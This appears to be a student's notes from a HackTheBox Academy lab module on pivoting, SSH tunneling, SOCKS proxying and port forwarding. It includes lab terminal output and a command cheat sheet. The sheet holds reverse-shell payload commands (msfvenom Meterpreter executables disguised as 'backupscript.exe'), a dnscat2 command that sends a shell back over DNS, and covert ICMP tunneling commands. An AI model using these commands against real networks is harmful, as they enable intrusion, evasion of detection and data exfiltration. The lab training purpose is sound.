
 
![](https://i.imgur.com/v4OmQjy.png)

# Pivoting Tunneling, and Port Forwarding

During a `red team engagement`, `penetration test`, or an `Active Directory assessment`, we will often find ourselves in a situation where we might have already compromised the required `credentials`, `ssh keys`, `hashes`, or `access tokens` to move onto another host, but there may be no other host directly reachable from our attack host. In such cases, we may need to use a `pivot host` that we have already compromised to find a way to our next target. One of the most important things to do when landing on a host for the first time is to check our `privilege level`, `network connections`, and potential `VPN or other remote access software`. If a host has more than one network adapter, we can likely use it to move to a different network segment. Pivoting is essentially the idea of `moving to other networks through a compromised host to find more targets on different network segments`.

There are many different terms used to describe a compromised host that we can use to `pivot` to a previously unreachable network segment. Some of the most common are:

- `Pivot Host`
- `Proxy`
- `Foothold`
- `Beach Head system`
- `Jump Host`

Pivoting's primary use is to defeat segmentation (both physically and virtually) to access an isolated network. `Tunneling`, on the other hand, is a subset of pivoting. Tunneling encapsulates network traffic into another protocol and routes traffic through it. Think of it like this:

We have a `key` we need to send to a partner, but we do not want anyone who sees our package to know it is a key. So we get a stuffed animal toy and hide the key inside with instructions about what it does. We then package the toy up and send it to our partner. Anyone who inspects the box will see a simple stuffed toy, not realizing it contains something else. Only our partner will know that the key is hidden inside and will learn how to access and use it once delivered.

Typical applications like VPNs or specialized browsers are just another form of tunneling network traffic.

![](https://i.imgur.com/ovH05zK.png)

#### Lateral Movement
Lateral movement can be described as a technique used to further our access to additional `hosts`, `applications`, and `services` within a network environment. Lateral movement can also help us gain access to specific domain resources we may need to elevate our privileges. Lateral Movement often enables privilege escalation across hosts.

#### Pivoting
Utilizing multiple hosts to cross `network` boundaries you would not usually have access to. This is more of a targeted objective. The goal here is to allow us to move deeper into a network by compromising targeted hosts or infrastructure.

#### Tunneling
We often find ourselves using various protocols to shuttle traffic in/out of a network where there is a chance of our traffic being detected. For example, using HTTP to mask our Command & Control traffic from a server we own to the victim host. The key here is obfuscation of our actions to avoid detection for as long as possible. We utilize protocols with enhanced security measures such as HTTPS over TLS or SSH over other transport protocols. These types of actions also enable tactics like the exfiltration of data out of a target network or the delivery of more payloads and instructions into the network.

### Port Forwarding
`Port forwarding` is a technique that allows us to redirect a communication request from one port to another. Port forwarding uses TCP as the primary communication layer to provide interactive communication for the forwarded port. However, different application layer protocols such as SSH or even [SOCKS](https://en.wikipedia.org/wiki/SOCKS) (non-application layer) can be used to encapsulate the forwarded traffic. This can be effective in bypassing firewalls and using existing services on your compromised host to pivot to other networks.
#### SSH  Local Port Forwarding
![](https://i.imgur.com/Afgxlom.png)

We have our attack host (10.10.15.x) and a target Ubuntu server (10.129.x.x), which we have compromised. We will scan the target Ubuntu server using Nmap to search for open ports.
```c
r3so1v3@htb[/htb]$ nmap -sT -p22,3306 10.129.202.64

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:12 EST
Nmap scan report for 10.129.202.64
Host is up (0.12s latency).

PORT     STATE  SERVICE
22/tcp   open   ssh
3306/tcp closed mysql

Nmap done: 1 IP address (1 host up) scanned in 0.68 seconds
```

SSH port is open. To access the MySQL service, we can either SSH into the server and access MySQL from inside the Ubuntu server, or we can port forward it to our localhost on port `1234` and access it locally. A benefit of accessing it locally is, if we want to execute a remote exploit on the MySQL service, we won't be able to do it without port forwarding. This is due to MySQL being hosted locally on the Ubuntu server on port `3306`. So, we will use the below command to forward our local port (1234) over SSH to the Ubuntu server.
```c
r3so1v3@htb[/htb]$ ssh -L 1234:localhost:3306 ubuntu@10.129.202.64

ubuntu@10.129.202.64's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu 24 Feb 2022 05:23:20 PM UTC

  System load:             0.0
  Usage of /:              28.4% of 13.72GB
  Memory usage:            34%
  Swap usage:              0%
  Processes:               175
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

66 updates can be applied immediately.
45 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable
```
The `-L` command tells the SSH client to request the SSH server to forward all the data we send via the port `1234` to `localhost:3306` on the Ubuntu server. By doing this, we should be able to access the MySQL service locally on port 1234. We can use Netstat or Nmap to query our local host on 1234 port to verify whether the MySQL service was forwarded.
#### Confirming Port Forward with Netstat
```c
r3so1v3@htb[/htb]$ netstat -antp | grep 1234

(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
tcp        0      0 127.0.0.1:1234          0.0.0.0:*               LISTEN      4034/ssh            
tcp6       0      0 ::1:1234                :::*                    LISTEN      4034/ssh
```

#### Confirming Port Forward with Nmap
```c
r3so1v3@htb[/htb]$ nmap -v -sV -p1234 localhost

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:18 EST
NSE: Loaded 45 scripts for scanning.
Initiating Ping Scan at 12:18
Scanning localhost (127.0.0.1) [2 ports]
Completed Ping Scan at 12:18, 0.01s elapsed (1 total hosts)
Initiating Connect Scan at 12:18
Scanning localhost (127.0.0.1) [1 port]
Discovered open port 1234/tcp on 127.0.0.1
Completed Connect Scan at 12:18, 0.01s elapsed (1 total ports)
Initiating Service scan at 12:18
Scanning 1 service on localhost (127.0.0.1)
Completed Service scan at 12:18, 0.12s elapsed (1 service on 1 host)
NSE: Script scanning 127.0.0.1.
Initiating NSE at 12:18
Completed NSE at 12:18, 0.01s elapsed
Initiating NSE at 12:18
Completed NSE at 12:18, 0.00s elapsed
Nmap scan report for localhost (127.0.0.1)
Host is up (0.0080s latency).
Other addresses for localhost (not scanned): ::1

PORT     STATE SERVICE VERSION
1234/tcp open  mysql   MySQL 8.0.28-0ubuntu0.20.04.3

```

Similarly, if we want to forward multiple ports from the Ubuntu server to your localhost, you can do so by including the `local port:server:port` argument to your ssh command. For example, the below command forwards the apache web server's port 80 to your attack host's local port on `8080`.
```c
r3so1v3@htb[/htb]$ ssh -L 1234:localhost:3306 -L 8080:localhost:80 ubuntu@10.129.202.64
```

#### Setting up to Pivot

Now, if you type `ifconfig` on the Ubuntu host, you will find that this server has multiple NICs:

- One connected to our attack host (`ens192`)
- One communicating to other hosts within a different network (`ens224`)
- The loopback interface (`lo`).

```c
ubuntu@WEB01:~$ ifconfig 

ens192: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.129.202.64  netmask 255.255.0.0  broadcast 10.129.255.255
        inet6 dead:beef::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x0<global>
        inet6 fe80::250:56ff:feb9:52eb  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:52:eb  txqueuelen 1000  (Ethernet)
        RX packets 35571  bytes 177919049 (177.9 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 10452  bytes 1474767 (1.4 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

ens224: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 172.16.5.129  netmask 255.255.254.0  broadcast 172.16.5.255
        inet6 fe80::250:56ff:feb9:a9aa  prefixlen 64  scopeid 0x20<link>
        ether 00:50:56:b9:a9:aa  txqueuelen 1000  (Ethernet)
        RX packets 8251  bytes 1125190 (1.1 MB)
        RX errors 0  dropped 40  overruns 0  frame 0
        TX packets 1538  bytes 123584 (123.5 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 270  bytes 22432 (22.4 KB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 270  bytes 22432 (22.4 KB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
```

In our current scenario, we don't know which services lie on the other side of the network. So, we can scan smaller ranges of IPs on the network (`172.16.5.1-200`) network or the entire subnet (`172.16.5.0/23`). We cannot perform this scan directly from our attack host because it does not have routes to the `172.16.5.0/23` network. To do this, we will have to perform `dynamic port forwarding` and `pivot` our network packets via the Ubuntu server. We can do this by starting a `SOCKS listener` on our `local host` (personal attack host or Pwnbox) and then configure SSH to forward that traffic via SSH to the network (172.16.5.0/23) after connecting to the target host.

This is called `SSH tunneling` over `SOCKS proxy`. SOCKS stands for `Socket Secure`, a protocol that helps communicate with servers where you have firewall restrictions in place. Unlike most cases where you would initiate a connection to connect to a service, in the case of SOCKS, the initial traffic is generated by a SOCKS client, which connects to the SOCKS server controlled by the user who wants to access a service on the client-side. Once the connection is established, network traffic can be routed through the SOCKS server on behalf of the connected client.

This technique is often used to circumvent the restrictions put in place by firewalls, and allow an external entity to bypass the firewall and access a service within the firewalled environment. One more benefit of using SOCKS proxy for pivoting and forwarding data is that SOCKS proxies can pivot via creating a route to an external server from `NAT networks`. SOCKS proxies are currently of two types: `SOCKS4` and `SOCKS5`. SOCKS4 doesn't provide any authentication and UDP support, whereas SOCKS5 does provide that. Let's take an example of the below image where we have a NAT'd network of 172.16.5.0/23, which we cannot access directly.

![](https://i.imgur.com/227v1yN.png)

The attack host starts the SSH client and requests the SSH server to allow it to send some TCP data over the ssh socket. The SSH server responds with an acknowledgment, and the SSH client then starts listening on `localhost:9050`. Whatever data you send here will be broadcasted to the entire network (172.16.5.0/23) over SSH. We can use the below command to perform this dynamic port forwarding.

#### Enabling Dynamic Port Forwarding with SSH
```c
r3so1v3@htb[/htb]$ ssh -D 9050 ubuntu@10.129.202.64
```

The `-D` argument requests the SSH server to enable dynamic port forwarding. Once we have this enabled, we will require a tool that can route any tool's packets over the port `9050`. We can do this using the tool `proxychains`, which is capable of redirecting TCP connections through TOR, SOCKS, and HTTP/HTTPS proxy servers and also allows us to chain multiple proxy servers together. Using proxychains, we can hide the IP address of the requesting host as well since the receiving host will only see the IP of the pivot host. Proxychains is often used to force an application's `TCP traffic` to go through hosted proxies like `SOCKS4`/`SOCKS5`, `TOR`, or `HTTP`/`HTTPS` proxies.

To inform proxychains that we must use port 9050, we must modify the proxychains configuration file located at `/etc/proxychains.conf`. We can add `socks4 127.0.0.1 9050` to the last line if it is not already there.
```c
r3so1v3@htb[/htb]$ tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

Now when you start Nmap with proxychains using the below command, it will route all the packets of Nmap to the local port 9050, where our SSH client is listening, which will forward all the packets over SSH to the 172.16.5.0/23 network.
```c
r3so1v3@htb[/htb]$ proxychains nmap -v -sn 172.16.5.1-200

ProxyChains-3.1 (http://proxychains.sf.net)

Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:30 EST
Initiating Ping Scan at 12:30
Scanning 10 hosts [2 ports/host]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.2:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.5:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.6:80-<--timeout
RTTVAR has grown to over 2.3 seconds, decreasing to 2.0

<SNIP>
```

This part of packing all your Nmap data using proxychains and forwarding it to a remote server is called `SOCKS tunneling`. One more important note to remember here is that we can only perform a `full TCP connect scan` over proxychains. The reason for this is that proxychains cannot understand partial packets. If you send partial packets like half connect scans, it will return incorrect results. We also need to make sure we are aware of the fact that `host-alive` checks may not work against Windows targets because the Windows Defender firewall blocks ICMP requests (traditional pings) by default. 

##### Enumerating the Windows Target through Proxychains
```c
r3so1v3@htb[/htb]$ proxychains nmap -v -Pn -sT 172.16.5.19

ProxyChains-3.1 (http://proxychains.sf.net)
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-02-24 12:33 EST
Initiating Parallel DNS resolution of 1 host. at 12:33
Completed Parallel DNS resolution of 1 host. at 12:33, 0.15s elapsed
Initiating Connect Scan at 12:33
Scanning 172.16.5.19 [1000 ports]
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1720-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:587-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:445-<><>-OK
Discovered open port 445/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8080-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:23-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:135-<><>-OK
Discovered open port 135/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:110-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:21-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:554-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-1172.16.5.19:25-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:5900-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:1025-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:143-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:199-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:993-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:995-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Discovered open port 3389/tcp on 172.16.5.19
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:443-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:113-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:8888-<--timeout
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:139-<><>-OK
Discovered open port 139/tcp on 172.16.5.19
```

The Nmap scan shows several open ports, one of which is `RDP port` (3389). Similar to the Nmap scan, we can also pivot `msfconsole` via proxychains to perform vulnerable RDP scans using Metasploit auxiliary modules. We can start msfconsole with proxychains.
#### Using rdp_scanner Module
```c
msf6 > search rdp_scanner

Matching Modules
================

   #  Name                               Disclosure Date  Rank    Check  Description
   -  ----                               ---------------  ----    -----  -----------
   0  auxiliary/scanner/rdp/rdp_scanner                   normal  No     Identify endpoints speaking the Remote Desktop Protocol (RDP)


Interact with a module by name or index. For example info 0, use 0 or use auxiliary/scanner/rdp/rdp_scanner

msf6 > use 0
msf6 auxiliary(scanner/rdp/rdp_scanner) > set rhosts 172.16.5.19
rhosts => 172.16.5.19
msf6 auxiliary(scanner/rdp/rdp_scanner) > run
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK

[*] 172.16.5.19:3389      - Detected RDP on 172.16.5.19:3389      (name:DC01) (domain:DC01) (domain_fqdn:DC01) (server_fqdn:DC01) (os_version:10.0.17763) (Requires NLA: No)
[*] 172.16.5.19:3389      - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

#### Using xfreerdp with Proxychains
```c
r3so1v3@htb[/htb]$ proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123

ProxyChains-3.1 (http://proxychains.sf.net)
[13:02:42:481] [4829:4830] [INFO][com.freerdp.core] - freerdp_connect:freerdp_set_last_error_ex resetting error state
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpdr
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx rdpsnd
[13:02:42:482] [4829:4830] [INFO][com.freerdp.client.common.cmdline] - loading channelEx cliprdr
```

### Web Server Pivoting with Rpivot

Rpivot is a reverse SOCKS proxy tool written in Python for SOCKS tunneling. Rpivot binds a machine inside a corporate network to an external server and exposes the client's local port on the server-side. We will take the scenario below, where we have a web server on our internal network (172.16.5.135), and we want to access that using the rpivot proxy.
![](https://i.imgur.com/LJnPJwj.png)


## Commands

| Command                                                                                                                                                                                                            | Description                                                                                                                                                                                                                                                             |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `ifconfig`                                                                                                                                                                                                         | Linux-based command that displays all current network configurations of a system.                                                                                                                                                                                       |
| `ipconfig`                                                                                                                                                                                                         | Windows-based command that displays all system network configurations.                                                                                                                                                                                                  |
| `netstat -r`                                                                                                                                                                                                       | Command used to display the routing table for all IPv4-based protocols.                                                                                                                                                                                                 |
| `nmap -sT -p22,3306 <IPaddressofTarget>`                                                                                                                                                                           | Nmap command used to scan a target for open ports allowing SSH or MySQL connections.                                                                                                                                                                                    |
| `ssh -L 1234:localhost:3306 Ubuntu@<IPaddressofTarget>`                                                                                                                                                            | SSH comand used to create an SSH tunnel from a local machine on local port `1234` to a remote target using port 3306.                                                                                                                                                   |
| `netstat -antp \| grep 1234`                                                                                                                                                                                       | Netstat option used to display network connections associated with a tunnel created. Using `grep` to filter based on local port `1234` .                                                                                                                                |
| `nmap -v -sV -p1234 localhost`                                                                                                                                                                                     | Nmap command used to scan a host through a connection that has been made on local port `1234`.                                                                                                                                                                          |
| `ssh -L 1234:localhost:3306 8080:localhost:80 ubuntu@<IPaddressofTarget>`                                                                                                                                          | SSH command that instructs the ssh client to request the SSH server forward all data via port `1234` to `localhost:3306`.                                                                                                                                               |
| `ssh -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                           | SSH command used to perform a dynamic port forward on port `9050` and establishes an SSH tunnel with the target. This is part of setting up a SOCKS proxy.                                                                                                              |
| `tail -4 /etc/proxychains.conf`                                                                                                                                                                                    | Linux-based command used to display the last 4 lines of /etc/proxychains.conf. Can be used to ensure socks configurations are in place.                                                                                                                                 |
| `proxychains nmap -v -sn 172.16.5.1-200`                                                                                                                                                                           | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against the hosts in the specified range `172.16.5.1-200` with increased verbosity (`-v`) disabling ping scan (`-sn`).                                          |
| `proxychains nmap -v -Pn -sT 172.16.5.19`                                                                                                                                                                          | Used to send traffic generated by an Nmap scan through Proxychains and a SOCKS proxy. Scan is performed against 172.16.5.19 with increased verbosity (`-v`), disabling ping discover (`-Pn`), and using TCP connect scan type (`-sT`).                                  |
| `proxychains msfconsole`                                                                                                                                                                                           | Uses Proxychains to open Metasploit and send all generated network traffic through a SOCKS proxy.                                                                                                                                                                       |
| `msf6 > search rdp_scanner`                                                                                                                                                                                        | Metasploit search that attempts to find a module called `rdp_scanner`.                                                                                                                                                                                                  |
| `proxychains xfreerdp /v:<IPaddressofTarget> /u:victor /p:pass@123`                                                                                                                                                | Used to connect to a target using RDP and a set of credentials using proxychains. This will send all traffic through a SOCKS proxy.                                                                                                                                     |
| `msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InteralIPofPivotHost> -f exe -o backupscript.exe LPORT=8080`                                                                                            | Uses msfvenom to generate a Windows-based reverse HTTPS Meterpreter payload that will send a call back to the IP address specified following `lhost=` on local port 8080 (`LPORT=8080`). Payload will take the form of an executable file called `backupscript.exe`.    |
| `msf6 > use exploit/multi/handler`                                                                                                                                                                                 | Used to select the multi-handler exploit module in Metasploit.                                                                                                                                                                                                          |
| `scp backupscript.exe ubuntu@<ipAddressofTarget>:~/`                                                                                                                                                               | Uses secure copy protocol (`scp`) to transfer the file `backupscript.exe` to the specified host and places it in the Ubuntu user's home directory (`:~/`).                                                                                                              |
| `python3 -m http.server 8123`                                                                                                                                                                                      | Uses Python3 to start a simple HTTP server listening on port `8123`. Can be used to retrieve files from a host.                                                                                                                                                         |
| `Invoke-WebRequest -Uri "http://172.16.5.129:8123/backupscript.exe" -OutFile "C:\backupscript.exe"`                                                                                                                | PowerShell command used to download a file called backupscript.exe from a webserver (`172.16.5.129:8123`) and then save the file to location specified after `-OutFile`.                                                                                                |
| `ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:80 ubuntu@<ipAddressofTarget> -vN`                                                                                                                                    | SSH command used to create a reverse SSH tunnel from a target to an attack host. Traffic is forwarded on port `8080` on the attack host to port `80` on the target.                                                                                                     |
| `msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<IPaddressofAttackHost -f elf -o backupjob LPORT=8080`                                                                                                        | Uses msfveom to generate a Linux-based Meterpreter reverse TCP payload that calls back to the IP specified after `LHOST=` on port 8080 (`LPORT=8080`). Payload takes the form of an executable elf file called backupjob.                                               |
| `msf6> run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23`                                                                                                                                                      | Metasploit command that runs a ping sweep module against the specified network segment (`RHOSTS=172.16.5.0/23`).                                                                                                                                                        |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |
| `for i in {1..254} ;do (ping -c 1 172.16.5.$i \| grep "bytes from" &) ;done`                                                                                                                                       | For Loop used on a Linux-based system to discover devices in a specified network segment.                                                                                                                                                                               |
| `for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 \| find "Reply"`                                                                                                                                           | For Loop used on a Windows-based system to discover devices in a specified network segment.                                                                                                                                                                             |
| `1..254 \| % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}`                                                                                                                          | PowerShell one-liner used to ping addresses 1 - 254 in the specified network segment.                                                                                                                                                                                   |
| `msf6 > use auxiliary/server/socks_proxy`                                                                                                                                                                          | Metasploit command that selects the `socks_proxy` auxiliary module.                                                                                                                                                                                                     |
| `msf6 auxiliary(server/socks_proxy) > jobs`                                                                                                                                                                        | Metasploit command that lists all currently running jobs.                                                                                                                                                                                                               |
| `socks4 127.0.0.1 9050`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 4 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
| `Socks5 127.0.0.1 1080`                                                                                                                                                                                            | Line of text that should be added to /etc/proxychains.conf to ensure a SOCKS version 5 proxy is used in combination with proxychains on the specified IP address and port.                                                                                              |
| `msf6 > use post/multi/manage/autoroute`                                                                                                                                                                           | Metasploit command used to select the autoroute module.                                                                                                                                                                                                                 |
|                                                                                                                                                                                                                    |                                                                                                                                                                                                                                                                         |
| `meterpreter > help portfwd`                                                                                                                                                                                       | Meterpreter command used to display the features of the portfwd command.                                                                                                                                                                                                |
| `meterpreter > portfwd add -l 3300 -p 3389 -r <IPaddressofTarget>`                                                                                                                                                 | Meterpreter-based portfwd command that adds a forwarding rule to the current Meterpreter session. This rule forwards network traffic on port 3300 on the local machine to port 3389 (RDP) on the target.                                                                |
| `xfreerdp /v:localhost:3300 /u:victor /p:pass@123`                                                                                                                                                                 | Uses xfreerdp to connect to a remote host through localhost:3300 using a set of credentials. Port forwarding rules must be in place for this to work properly.                                                                                                          |
| `netstat -antp`                                                                                                                                                                                                    | Used to display all (`-a`) active network connections with associated process IDs. `-t` displays only TCP connections.`-n` displays only numerical addresses. `-p` displays process IDs associated with each displayed connection.                                      |
| `meterpreter > portfwd add -R -l 8081 -p 1234 -L <IPaddressofAttackHost>`                                                                                                                                          | Meterpreter-based portfwd command that adds a forwarding rule that directs traffic coming on on port 8081 to the port `1234` listening on the IP address of the Attack Host.                                                                                            |
| `meterpreter > bg`                                                                                                                                                                                                 | Meterpreter-based command used to run the selected metepreter session in the background. Similar to background a process in Linux                                                                                                                                       |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofAttackHost>:80`                                                                                                                                                      | Uses Socat to listen on port 8080 and then to fork when the connection is received. It will then connect to the attack host on port 80.                                                                                                                                 |
| `socat TCP4-LISTEN:8080,fork TCP4:<IPaddressofTarget>:8443`                                                                                                                                                        | Uses Socat to listen on port 8080 and then to fork when the connection is received. Then it will connect to the target host on port 8443.                                                                                                                               |
| `plink -D 9050 ubuntu@<IPaddressofTarget>`                                                                                                                                                                         | Windows-based command that uses PuTTY's Plink.exe to perform SSH dynamic port forwarding and establishes an SSH tunnel with the specified target. This will allow for proxy chaining on a Windows host, similar to what is done with Proxychains on a Linux-based host. |
| `sudo apt-get install sshuttle`                                                                                                                                                                                    | Uses apt-get to install the tool sshuttle.                                                                                                                                                                                                                              |
| `sudo sshuttle -r ubuntu@10.129.202.64 172.16.5.0 -v`                                                                                                                                                              | Runs sshuttle, connects to the target host, and creates a route to the 172.16.5.0 network so traffic can pass from the attack host to hosts on the internal network (`172.16.5.0`).                                                                                     |
| `sudo git clone https://github.com/klsecservices/rpivot.git`                                                                                                                                                       | Clones the rpivot project GitHub repository.                                                                                                                                                                                                                            |
| `sudo apt-get install python2.7`                                                                                                                                                                                   | Uses apt-get to install python2.7.                                                                                                                                                                                                                                      |
| `python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0`                                                                                                                                     | Used to run the rpivot server (`server.py`) on proxy port `9050`, server port `9999` and listening on any IP address (`0.0.0.0`).                                                                                                                                       |
| `scp -r rpivot ubuntu@<IPaddressOfTarget>`                                                                                                                                                                         | Uses secure copy protocol to transfer an entire directory and all of its contents to a specified target.                                                                                                                                                                |
| `python2.7 client.py --server-ip 10.10.14.18 --server-port 9999`                                                                                                                                                   | Used to run the rpivot client (`client.py`) to connect to the specified rpivot server on the appropriate port.                                                                                                                                                          |
| `proxychains firefox-esr <IPaddressofTargetWebServer>:80`                                                                                                                                                          | Opens firefox with Proxychains and sends the web request through a SOCKS proxy server to the specified destination web server.                                                                                                                                          |
| `python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>` | Use to run the rpivot client to connect to a web server that is using HTTP-Proxy with NTLM authentication.                                                                                                                                                              |
| `netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.42.198 connectport=3389 connectaddress=172.16.5.25`                                                                                 | Windows-based command that uses `netsh.exe` to configure a portproxy rule called `v4tov4` that listens on port 8080 and forwards connections to the destination 172.16.5.25 on port 3389.                                                                               |
| `netsh.exe interface portproxy show v4tov4`                                                                                                                                                                        | Windows-based command used to view the configurations of a portproxy rule called v4tov4.                                                                                                                                                                                |
| `git clone https://github.com/iagox86/dnscat2.git`                                                                                                                                                                 | Clones the `dnscat2` project GitHub repository.                                                                                                                                                                                                                         |
| `sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache`                                                                                                                        | Used to start the dnscat2.rb server running on the specified IP address, port (`53`) & using the domain `inlanefreight.local` with the no-cache option enabled.                                                                                                         |
| `git clone https://github.com/lukebaggett/dnscat2-powershell.git`                                                                                                                                                  | Clones the dnscat2-powershell project Github repository.                                                                                                                                                                                                                |
| `Import-Module dnscat2.ps1`                                                                                                                                                                                        | PowerShell command used to import the dnscat2.ps1 tool.                                                                                                                                                                                                                 |
| `Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd`                                                                                     | PowerShell command used to connect to a specified dnscat2 server using a IP address, domain name and preshared secret. The client will send back a shell connection to the server (`-Exec cmd`).                                                                        |
| `dnscat2> ?`                                                                                                                                                                                                       | Used to list dnscat2 options.                                                                                                                                                                                                                                           |
| `dnscat2> window -i 1`                                                                                                                                                                                             | Used to interact with an established dnscat2 session.                                                                                                                                                                                                                   |
| `./chisel server -v -p 1234 --socks5`                                                                                                                                                                              | Used to start a chisel server in verbose mode listening on port `1234` using SOCKS version 5.                                                                                                                                                                           |
| `./chisel client -v 10.129.202.64:1234 socks`                                                                                                                                                                      | Used to connect to a chisel server at the specified IP address & port using socks.                                                                                                                                                                                      |
| `git clone https://github.com/utoni/ptunnel-ng.git`                                                                                                                                                                | Clones the ptunnel-ng project GitHub repository.                                                                                                                                                                                                                        |
| `sudo ./autogen.sh`                                                                                                                                                                                                | Used to run the autogen.sh shell script that will build the necessary ptunnel-ng files.                                                                                                                                                                                 |
| `sudo ./ptunnel-ng -r10.129.202.64 -R22`                                                                                                                                                                           | Used to start the ptunnel-ng server on the specified IP address (`-r`) and corresponding port (`-R22`).                                                                                                                                                                 |
| `sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22`                                                                                                                                                    | Used to connect to a specified ptunnel-ng server through local port 2222 (`-l2222`).                                                                                                                                                                                    |
| `ssh -p2222 -lubuntu 127.0.0.1`                                                                                                                                                                                    | SSH command used to connect to an SSH server through a local port. This can be used to tunnel SSH traffic through an ICMP tunnel.                                                                                                                                       |
| `regsvr32.exe SocksOverRDP-Plugin.dll`                                                                                                                                                                             | Windows-based command used to register the SocksOverRDP-PLugin.dll.                                                                                                                                                                                                     |
| `netstat -antb \|findstr 1080`                                                                                                                                                                                     | Windows-based command used to list TCP network connections listening on port 1080.                                                                                                                                                                                      |

# Questions & Answers

### Dynamic Port Forwarding with SSH and SOCKS Tunneling

1. You have successfully captured credentials to an external facing Web Server. Connect to the target and list the network interfaces. How many network interfaces does the target web server have? (Including the loopback interface)

SSH to 10.129.185.233 (ACADEMY-PIVOTING-LINUXPIV) with user "ubuntu" and password "HTB_@cademy_stdnt!"

